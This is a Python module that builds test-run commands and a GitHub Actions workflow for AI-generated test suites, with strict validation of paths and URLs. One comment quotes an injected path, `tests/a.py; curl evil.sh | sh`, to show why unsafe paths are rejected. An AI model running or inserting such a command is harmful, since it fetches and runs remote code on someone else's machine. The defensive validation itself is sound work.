"""How to actually run a generated suite, and how it reports back. No model, no cost.

Phase 3. Phase 1 wrote the tests; Phase 2 opened `POST /api/reviews/{id}/test-results` so
somebody could say what happened when they ran. Nobody did — because "run them and post the
result" is three unstated decisions (which command, which JUnit flag, which URL) and every
one of them is a reason it does not get done. This module removes all three by rendering
the two producers D-62 always intended:

* a **GitHub Actions workflow** that ships with the tests — install, run, post back;
* the argv for **`scripts/run_tests.py`**, which is a developer doing the same thing by hand.

Both fill the same contract and neither is privileged, exactly as `build_run.py` and
`modernization_pr.render_build_workflow` already are for the compiler. Nothing here runs
anything: D-05 is untouched, and the platform still only ever receives a report.

Why a table rather than asking the model
----------------------------------------
The model already told us the framework for each file. Turning "pytest" into
`python -m pytest --junitxml=...` is a lookup, and a lookup that is wrong is wrong the same
way every time — which is fixable. A second model call to produce a shell command would be
wrong differently every time, cost money, and put model-written shell into a file the
customer's CI executes. So: a table, and an honest `unknown` for anything not in it.

**JUnit XML is not free in every framework**, and pretending otherwise is how this fails on
run one. pytest, Playwright and Maven emit it natively or with a flag; Jest, Go, RSpec and
.NET need an extra reporter package installed first. Each row says which, the install step
adds it, and `plan_for` reports it so a reader is told before the job fails.

What it deliberately cannot do
------------------------------
A workflow cannot conjure a database, a running application, seeded rows or credentials —
C-63, which is a design question rather than a missing line. So prerequisites are collected
and **stated**, the workflow carries a commented `services:` block and an env section for
the customer to fill in, and the job is expected to fail until they do. A suite that never
ran still reports: the workflow posts one `errored` row saying so, because a report that
silently stops arriving looks exactly like a suite that stopped failing — the lesson
`modernization_pr`'s LMBUILD001 diagnostic already learned.

Everything interpolated into that file is **rejected rather than escaped**, the rule
`modernization_pr._yaml_scalar` established. Here the inputs are different (repo-relative
paths and framework labels written by a model, not URLs and version strings), so the
validator is its own — but a path that would need escaping is a path that has no business
being pasted into a shell command on somebody else's runner.

Stdlib only, and it imports nothing from `backend`. `scripts/run_tests.py` and the offline
smoke suite both read it, and a plan that needed a database connection to describe a shell
command would be a strange thing.
"""
import re
import xml.etree.ElementTree as ET
from typing import Any, Dict, List, Optional, Sequence, Tuple

# Where every runner is made to leave its JUnit XML. One directory so the report step has
# one glob, and a name unlikely to collide with anything the project already has.
RESULTS_DIR = "lm-test-results"

WORKFLOW_PATH = ".github/workflows/lm-generated-tests.yml"

# An API key rather than a JWT, for the reason the modernization workflow records: a bearer
# token expires, and a callback that quietly starts 401ing looks like a suite that stopped
# failing.
API_KEY_SECRET = "LM_API_KEY"

# Prerequisites a hosted runner cannot supply on its own. `browser` is absent on purpose —
# the Playwright and Cypress rows install one, so it is the single prerequisite this file
# can actually satisfy.
CANNOT_SUPPLY = ("running application", "database", "credentials", "seeded test data")

# A repo-relative path that is safe to paste into a shell command on somebody else's CI
# runner. Deliberately narrow: no spaces, no shell metacharacters, no absolute paths, no
# `..`. These strings are written by a model, and `tests/a.py; curl evil.sh | sh` is a path
# as far as JSON is concerned.
_SAFE_PATH = re.compile(r"^[A-Za-z0-9_][A-Za-z0-9._/-]{0,200}$")

# Same idea for anything that lands in a step name or a comment.
_SAFE_LABEL = re.compile(r"^[A-Za-z0-9][A-Za-z0-9 ._/+#-]{0,60}$")


def safe_path(path: str) -> bool:
    """True if `path` can be handed to a shell as a literal argument."""
    text = (path or "").strip()
    return bool(_SAFE_PATH.match(text)) and ".." not in text.split("/")


def safe_url(url: str) -> str:
    """An https(s) URL with nothing in it that could break out of a quoted YAML scalar.

    Rejected, not escaped — `modernization_pr._yaml_scalar`'s rule, and for the same reason:
    a URL that needs escaping is a caller sending something this was never meant to carry
    into a file somebody else's CI executes.
    """
    text = (url or "").strip()
    if not text.startswith(("http://", "https://")):
        raise ValueError(f"callback URL must be an http(s) URL: {text!r}")
    if any(ch.isspace() for ch in text) or "'" in text or '"' in text:
        raise ValueError(f"callback URL must not contain whitespace or quotes: {text!r}")
    return text


# ── The runners ─────────────────────────────────────────────────────────────
#
# `argv` and `shell` are two renderings of one command: `run_tests.py` executes the argv
# list with no shell at all, and the workflow needs a string. They are built from the same
# row so the local run and the CI run cannot drift into testing different things.
#
# `supports_paths` is the field that changes what a report means. Maven, Gradle and
# `dotnet test` run a project, not a file list, so those jobs run the customer's whole suite
# and their own tests arrive as `unmatched` — which Phase 2 already counts rather than
# drops. The ones that take paths run only what was generated.

_RUNNERS: Tuple[Dict[str, Any], ...] = (
    {
        "key": "pytest",
        "label": "pytest",
        "aliases": ("pytest", "py.test", "python unittest", "unittest"),
        "language": "python",
        "supports_paths": True,
        "install": ["python -m pip install --upgrade pip",
                    "pip install pytest",
                    "if [ -f requirements.txt ]; then pip install -r requirements.txt; fi"],
        "argv": ["python", "-m", "pytest", "{paths}",
                 "--junitxml=" + RESULTS_DIR + "/pytest.xml"],
        "results": RESULTS_DIR + "/pytest.xml",
        "junit_needs": "",
    },
    {
        "key": "jest",
        "label": "Jest",
        "aliases": ("jest", "jest + supertest", "supertest", "ts-jest"),
        "language": "node",
        "supports_paths": True,
        "install": ["npm ci || npm install",
                    "npm install --no-save jest-junit"],
        "env": {"JEST_JUNIT_OUTPUT_FILE": RESULTS_DIR + "/jest.xml"},
        "argv": ["npx", "--yes", "jest", "{paths}",
                 "--reporters=default", "--reporters=jest-junit"],
        "results": RESULTS_DIR + "/jest.xml",
        "junit_needs": "jest-junit",
    },
    {
        "key": "vitest",
        "label": "Vitest",
        "aliases": ("vitest",),
        "language": "node",
        "supports_paths": True,
        "install": ["npm ci || npm install"],
        "argv": ["npx", "--yes", "vitest", "run", "{paths}", "--reporter=junit",
                 "--outputFile=" + RESULTS_DIR + "/vitest.xml"],
        "results": RESULTS_DIR + "/vitest.xml",
        "junit_needs": "",
    },
    {
        "key": "mocha",
        "label": "Mocha",
        "aliases": ("mocha", "mocha + chai", "chai"),
        "language": "node",
        "supports_paths": True,
        "install": ["npm ci || npm install", "npm install --no-save mocha-junit-reporter"],
        "argv": ["npx", "--yes", "mocha", "{paths}", "--reporter", "mocha-junit-reporter",
                 "--reporter-options", "mochaFile=" + RESULTS_DIR + "/mocha.xml"],
        "results": RESULTS_DIR + "/mocha.xml",
        "junit_needs": "mocha-junit-reporter",
    },
    {
        "key": "playwright",
        "label": "Playwright",
        "aliases": ("playwright", "playwright test", "@playwright/test"),
        "language": "node",
        "supports_paths": True,
        "install": ["npm ci || npm install",
                    "npx --yes playwright install --with-deps chromium"],
        "env": {"PLAYWRIGHT_JUNIT_OUTPUT_NAME": RESULTS_DIR + "/playwright.xml"},
        "argv": ["npx", "--yes", "playwright", "test", "{paths}", "--reporter=junit"],
        "results": RESULTS_DIR + "/playwright.xml",
        "junit_needs": "",
        "supplies": ("browser",),
    },
    {
        "key": "cypress",
        "label": "Cypress",
        "aliases": ("cypress",),
        "language": "node",
        "supports_paths": True,
        "install": ["npm ci || npm install", "npm install --no-save junit-report-merger"],
        "argv": ["npx", "--yes", "cypress", "run", "--spec", "{paths_csv}",
                 "--reporter", "junit",
                 "--reporter-options", "mochaFile=" + RESULTS_DIR + "/cypress-[hash].xml"],
        "results": RESULTS_DIR + "/cypress-*.xml",
        "junit_needs": "",
        "supplies": ("browser",),
    },
    {
        "key": "maven",
        "label": "JUnit (Maven)",
        "aliases": ("junit", "junit 5", "junit5", "maven", "mvn", "surefire", "testng"),
        "language": "java",
        "supports_paths": False,
        "install": [],
        "argv": ["mvn", "-B", "test"],
        # Surefire writes where it likes; the report step reads one directory, so the
        # results are copied there rather than the glob being special-cased downstream.
        "collect": "cp target/surefire-reports/*.xml " + RESULTS_DIR + "/ 2>/dev/null || true",
        "results": "target/surefire-reports/*.xml",
        "junit_needs": "",
    },
    {
        "key": "gradle",
        "label": "JUnit (Gradle)",
        "aliases": ("gradle", "gradlew", "junit gradle"),
        "language": "java",
        "supports_paths": False,
        "install": [],
        "argv": ["./gradlew", "test"],
        "collect": "cp build/test-results/test/*.xml " + RESULTS_DIR + "/ 2>/dev/null || true",
        "results": "build/test-results/test/*.xml",
        "junit_needs": "",
    },
    {
        "key": "dotnet",
        "label": ".NET test",
        "aliases": ("xunit", "xunit.net", "nunit", "mstest", "dotnet test", "dotnet"),
        "language": "dotnet",
        "supports_paths": False,
        "install": ["dotnet add package JunitXml.TestLogger || true"],
        "argv": ["dotnet", "test", "--logger",
                 "junit;LogFilePath=" + RESULTS_DIR + "/dotnet.xml"],
        "results": RESULTS_DIR + "/dotnet.xml",
        "junit_needs": "JunitXml.TestLogger",
    },
    {
        "key": "phpunit",
        "label": "PHPUnit",
        "aliases": ("phpunit", "php unit", "pest"),
        "language": "php",
        "supports_paths": True,
        "install": ["composer install --no-interaction --no-progress || true"],
        "argv": ["vendor/bin/phpunit", "{paths}",
                 "--log-junit", RESULTS_DIR + "/phpunit.xml"],
        "results": RESULTS_DIR + "/phpunit.xml",
        "junit_needs": "",
    },
    {
        "key": "go",
        "label": "go test",
        "aliases": ("go test", "go", "golang", "testify", "gotestsum"),
        "language": "go",
        "supports_paths": False,
        "install": ["go install gotest.tools/gotestsum@latest"],
        "argv": ["gotestsum", "--junitfile", RESULTS_DIR + "/go.xml", "--", "./..."],
        "results": RESULTS_DIR + "/go.xml",
        "junit_needs": "gotestsum",
    },
    {
        "key": "rspec",
        "label": "RSpec",
        "aliases": ("rspec", "ruby", "minitest"),
        "language": "ruby",
        "supports_paths": True,
        "install": ["bundle install || gem install rspec rspec_junit_formatter"],
        "argv": ["bundle", "exec", "rspec", "{paths}", "--format", "RspecJunitFormatter",
                 "--out", RESULTS_DIR + "/rspec.xml"],
        "results": RESULTS_DIR + "/rspec.xml",
        "junit_needs": "rspec_junit_formatter",
    },
)

# One setup action per language. Versions are pinned to a major so a runner image change
# does not silently move the interpreter under a suite that was written against it.
_LANG_SETUP: Dict[str, List[str]] = {
    "python": ["- uses: actions/setup-python@v5", "  with:", "    python-version: '3.12'"],
    "node": ["- uses: actions/setup-node@v4", "  with:", "    node-version: '20'"],
    "java": ["- uses: actions/setup-java@v4", "  with:", "    distribution: temurin",
             "    java-version: '17'"],
    "dotnet": ["- uses: actions/setup-dotnet@v4", "  with:", "    dotnet-version: '8.0.x'"],
    "php": ["- uses: shivammathur/setup-php@v2", "  with:", "    php-version: '8.2'"],
    "go": ["- uses: actions/setup-go@v5", "  with:", "    go-version: '1.22'"],
    "ruby": ["- uses: ruby/setup-ruby@v1", "  with:", "    ruby-version: '3.2'"],
}


def normalise_framework(text: str) -> str:
    """A model's free-text framework name -> a runner key, or "" if it is not one we know.

    Matched loosely because the field is prose: "pytest", "Pytest 8", "pytest + httpx" and
    "PyTest" are all the same runner, and refusing three of them helps nobody. Longer
    aliases are tried first so "jest + supertest" does not match on "jest" alone when a more
    specific row exists.
    """
    hay = re.sub(r"[^a-z0-9+. ]+", " ", (text or "").lower()).strip()
    if not hay:
        return ""
    best = ""
    best_len = 0
    for runner in _RUNNERS:
        for alias in runner["aliases"]:
            if len(alias) > best_len and re.search(
                    r"(?:^|\s)" + re.escape(alias) + r"(?:\s|$)", hay):
                best, best_len = runner["key"], len(alias)
    return best


def _runner(key: str) -> Optional[Dict[str, Any]]:
    return next((r for r in _RUNNERS if r["key"] == key), None)


def _expand(argv: Sequence[str], paths: Sequence[str]) -> List[str]:
    """Substitute the two path placeholders. `{paths}` becomes one argument per file;
    `{paths_csv}` becomes a single comma-joined argument, which is what Cypress `--spec`
    wants and the only reason the second form exists."""
    out: List[str] = []
    for token in argv:
        if token == "{paths}":
            out.extend(paths)
        elif token == "{paths_csv}":
            out.append(",".join(paths))
        else:
            out.append(token)
    return out


def _shell(argv: Sequence[str]) -> str:
    """Render argv for a `run:` block. Every token is already known safe — paths passed
    `safe_path` and the rest are literals from the table above — so quoting is only needed
    where a token carries a character the shell would read, and `'...'` is enough for those.
    """
    parts = []
    for token in argv:
        parts.append(token if re.match(r"^[A-Za-z0-9._/=:-]+$", token) else f"'{token}'")
    return " ".join(parts)


def plan_for(test_files: Sequence[Dict[str, Any]]) -> Dict[str, Any]:
    """Group a generation's files by framework and say how each group runs.

    Returns jobs in a stable order, plus everything a reader has to be told *before* they
    run: frameworks nothing here knows, paths refused as unsafe, extra reporter packages
    the JUnit output depends on, and the prerequisites no CI runner can supply.
    """
    groups: Dict[str, List[str]] = {}
    unknown: List[str] = []
    rejected: List[str] = []
    prerequisites: set = set()
    supplied: set = set()

    for row in test_files or ():
        if not isinstance(row, dict):
            continue
        path = (row.get("path") or "").strip()
        for pre in row.get("prerequisites") or ():
            if isinstance(pre, str) and pre.strip() and pre.strip() != "none":
                prerequisites.add(pre.strip())
        key = normalise_framework(row.get("framework") or "")
        if not key:
            label = (row.get("framework") or "").strip() or "(none given)"
            if label not in unknown:
                unknown.append(label)
            continue
        if not safe_path(path):
            # Not silently skipped: a file that cannot be named is a file the run will not
            # cover, and the reader has to know which one.
            rejected.append(path or "(empty path)")
            continue
        groups.setdefault(key, []).append(path)

    jobs: List[Dict[str, Any]] = []
    for runner in _RUNNERS:                       # table order, so output is stable
        paths = sorted(set(groups.get(runner["key"], ())))
        if not paths:
            continue
        supplied.update(runner.get("supplies") or ())
        argv = _expand(runner["argv"], paths if runner["supports_paths"] else [])
        jobs.append({
            "framework": runner["key"],
            "label": runner["label"],
            "language": runner["language"],
            "paths": paths,
            "runs_whole_suite": not runner["supports_paths"],
            "install": list(runner["install"]),
            "env": dict(runner.get("env") or {}),
            "argv": argv,
            "shell": _shell(argv),
            "collect": runner.get("collect", ""),
            "results": runner["results"],
            "junit_needs": runner["junit_needs"],
        })

    return {
        "jobs": jobs,
        "results_dir": RESULTS_DIR,
        "unknown_frameworks": unknown,
        "unsafe_paths": rejected,
        # What the customer has to provide before any of this passes. C-63, named rather
        # than discovered when the job goes red.
        "must_supply": sorted(p for p in prerequisites
                              if p in CANNOT_SUPPLY and p not in supplied),
        "other_prerequisites": sorted(p for p in prerequisites
                                      if p not in CANNOT_SUPPLY or p in supplied),
        "extra_packages": sorted({j["junit_needs"] for j in jobs if j["junit_needs"]}),
    }



def merge_junit(documents) -> str:
    """Several JUnit XML documents -> one, or "" if none of them held a suite.

    An API suite and a browser suite are different runners writing different files, and the
    results endpoint takes one report per run. Posting each separately would file two runs
    against one execution, and every requirement covered by the other half would read as
    `not_run` — the phase's most important verdict, wrong.

    The workflow carries its own copy of this, inline, because a GitHub runner has no access
    to this file. `smoke_review_sources.py` runs both over the same input so the two cannot
    drift; changing one means changing the other.
    """
    merged = ET.Element("testsuites")
    found = 0
    for text in documents or ():
        try:
            root = ET.fromstring(text)
        except ET.ParseError:
            continue          # an unreadable file is not a reason to lose the readable ones
        for suite in ([root] if root.tag == "testsuite" else list(root.iter("testsuite"))):
            merged.append(suite)
            found += 1
    return ET.tostring(merged, encoding="unicode") if found else ""


# ── The workflow ────────────────────────────────────────────────────────────

# The report step. Python rather than `jq` + `curl`, unlike the modernization build
# workflow, for one reason the compiler case does not have: a suite can produce several
# JUnit files (an API suite and a browser suite are different runners), and the endpoint
# takes one report per run. Merging them in shell is where this would quietly lose half a
# suite; `ElementTree` does it in six lines. `python3` is present on every GitHub-hosted
# runner, whatever language the tests are in.
_REPORT_STEP = r"""python3 - <<'LM_REPORT_PY'
import glob, json, os, sys, urllib.error, urllib.request
import xml.etree.ElementTree as ET

key = os.environ.get("LM_API_KEY", "")
if not key:
    sys.exit("No API key. Add your LM AI-SDLC key as the repository secret __LM_SECRET__.")

merged = ET.Element("testsuites")
found = 0
for path in sorted(glob.glob("__LM_RESULTS_DIR__/**/*.xml", recursive=True)):
    try:
        root = ET.parse(path).getroot()
    except ET.ParseError as exc:
        print(f"  {path}: unreadable ({exc})")
        continue
    suites = [root] if root.tag == "testsuite" else list(root.iter("testsuite"))
    for suite in suites:
        merged.append(suite)
        found += 1

if found:
    payload = {"junit_xml": ET.tostring(merged, encoding="unicode")}
else:
    # A suite that never ran must still report. Nothing arriving is indistinguishable from
    # a suite that stopped failing, and every requirement would keep its unchallenged claim
    # of coverage. One errored row says what actually happened.
    payload = {"results": [{
        "name": "suite did not run",
        "status": "errored",
        "message": ("No JUnit XML was produced. The tests did not run: the install step, "
                    "the runner, or a prerequisite this workflow cannot supply "
                    "(an application, a database, credentials, seeded data)."),
    }]}
payload["source_label"] = "GitHub Actions run " + os.environ.get("GITHUB_RUN_ID", "?")

req = urllib.request.Request(
    os.environ["LM_RESULTS_URL"], data=json.dumps(payload).encode("utf-8"),
    headers={"Content-Type": "application/json", "X-API-Key": key}, method="POST")
try:
    with urllib.request.urlopen(req, timeout=60) as resp:
        body = json.loads(resp.read().decode("utf-8"))
except urllib.error.HTTPError as exc:
    sys.exit(f"The platform rejected the report ({exc.code}): {exc.read()[:400]!r}")

summary = body.get("summary") or {}
print(f"Reported {summary.get('total', 0)} test(s): {summary.get('passed', 0)} passed, "
      f"{summary.get('failed', 0)} failed, {summary.get('errored', 0)} did not load.")
for row in body.get("requirements") or []:
    print(f"  {str(row.get('outcome', '')).upper():<8} {row.get('requirement_ref', '')}")
LM_REPORT_PY"""


def _indent(lines: Sequence[str], spaces: int) -> List[str]:
    pad = " " * spaces
    return [(pad + line) if line else "" for line in lines]


def render_workflow(review_id: str, callback_url: str, plan: Dict[str, Any]) -> str:
    """The GitHub Actions workflow that runs this suite and posts the result back.

    `callback_url` is fully qualified and supplied by the caller: the platform cannot derive
    its own public address from a request behind a proxy, which is the trap
    `routes/modernization.py:512` records.
    """
    url = safe_url(callback_url)
    if not _SAFE_LABEL.match((review_id or "").strip()):
        raise ValueError(f"review id is not a safe identifier: {review_id!r}")
    jobs = plan.get("jobs") or []
    if not jobs:
        raise ValueError(
            "None of the generated files use a framework this can render a command for, so "
            "there is nothing to run. The suite is still downloadable; the command is "
            "yours to write.")

    out: List[str] = [
        f"# Generated by the LM AI-SDLC ReviewOps Agent for test run {review_id}.",
        "#",
        "# The platform did not write this suite's run command by asking a model — it is a",
        "# lookup from the framework each file declared. The platform never runs the tests",
        "# itself; this job does, and posts the result back so the coverage the generation",
        "# claimed can be checked against what actually ran.",
        "#",
        f"# Before this passes, add your platform API key as the repository secret "
        f"{API_KEY_SECRET}.",
    ]
    if plan.get("must_supply"):
        out += [
            "#",
            "# THIS JOB WILL FAIL UNTIL YOU SUPPLY: " + ", ".join(plan["must_supply"]) + ".",
            "# No hosted runner has these by default. Add a `services:` block, a step that",
            "# starts your application, and the secrets it needs — the marked places below.",
        ]
    out += [
        "",
        "name: LM generated tests",
        "",
        "on:",
        "  workflow_dispatch:",
        "  push:",
        "    branches: ['**']",
        "",
        "# Read-only. This job reports; it never writes to the repository.",
        "permissions:",
        "  contents: read",
        "",
        "jobs:",
        "  generated-tests:",
        "    runs-on: ubuntu-latest",
        "",
        "    # A database the tests need goes here. Commented out because guessing which",
        "    # one, at which version, with which credentials, would be a guess that fails",
        "    # on run one — and a wrong guess is harder to debug than an absent one.",
        "    # services:",
        "    #   postgres:",
        "    #     image: postgres:16",
        "    #     env: { POSTGRES_PASSWORD: postgres }",
        "    #     ports: ['5432:5432']",
        "",
        "    env:",
        "      # The application under test. Fill in what your tests read.",
        "      # BASE_URL: http://localhost:8000",
        "      # DATABASE_URL: postgres://postgres:postgres@localhost:5432/postgres",
        "      LM_RESULTS_URL: '" + url + "'",
        "",
        "    steps:",
        "      - uses: actions/checkout@v4",
        "",
    ]

    for language in sorted({job["language"] for job in jobs}):
        setup = _LANG_SETUP.get(language)
        if setup:
            out += _indent(setup, 6) + [""]

    out += [
        f"      - name: Make the results directory",
        f"        run: mkdir -p {RESULTS_DIR}",
        "",
    ]

    for job in jobs:
        if job["install"]:
            out += [f"      - name: Install for {job['label']}",
                    "        # `continue-on-error` so a failed install still reaches the",
                    "        # report step below: 'the dependencies would not install' is a",
                    "        # result, and one nobody sees if the job stops here.",
                    "        continue-on-error: true",
                    "        run: |"]
            out += _indent(job["install"], 10)
            out += [""]

        out += [f"      - name: Run {job['label']}",
                "        continue-on-error: true"]
        if job["env"]:
            out += ["        env:"]
            out += [f"          {k}: '{v}'" for k, v in sorted(job["env"].items())]
        out += ["        run: |", "          " + job["shell"]]
        if job["collect"]:
            out += ["          " + job["collect"]]
        out += [""]

    out += [
        "      # `always()`, because the failing run IS the payload. A workflow that stops",
        "      # at the first red step reports nothing, which is the one outcome worse than",
        "      # a red result.",
        "      - name: Report results to LM AI-SDLC",
        "        if: always()",
        "        env:",
        "          # Never echoed and never written to a file. Used only as the X-API-Key",
        "          # header by the script below.",
        f"          {API_KEY_SECRET}: " + "${{ secrets." + API_KEY_SECRET + " }}",
        "        run: |",
    ]
    report = (_REPORT_STEP
              .replace("__LM_RESULTS_DIR__", RESULTS_DIR)
              .replace("__LM_SECRET__", API_KEY_SECRET))
    out += _indent(report.split("\n"), 10)
    out += [
        "",
        "      # When the callback itself fails, this is the only copy of what ran.",
        "      - name: Upload the raw reports",
        "        if: always()",
        "        uses: actions/upload-artifact@v4",
        "        with:",
        "          name: lm-test-results",
        f"          path: {RESULTS_DIR}/",
        "          if-no-files-found: warn",
        "",
    ]
    return "\n".join(out)
